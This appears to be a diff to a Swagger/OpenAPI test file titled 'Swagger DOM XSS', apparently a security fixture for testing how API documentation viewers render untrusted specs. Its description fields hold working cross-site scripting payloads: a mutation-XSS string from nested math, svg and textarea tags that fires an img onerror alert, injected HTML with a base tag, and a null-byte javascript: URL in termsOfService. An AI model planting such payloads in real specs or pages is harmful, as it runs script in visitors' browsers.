@@ -1,8 +1,7 @@
 swagger: '2.0'
 info: 
   title: Swagger DOM XSS
-  description: <math><mtext><option><textarea><svg/onload=alert(1)>
-    
+  description: <mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form><h1>Desc: XSS
   termsOfService: "javascript:%00alert()"
   version: production
 basePath: /JSSResource/
@@ -20,7 +19,7 @@ paths:
       responses:
         '200':
           type: string   
-          description: <h1>prints xss</h1><img onfocus=print() src=x></img><svg/onload=alert() /></div>
+          description: <h1>prints xss</h1><img src=x/><svg></svg><base href='#'>
       tags:
         - accounts
       operationId: findAccounts
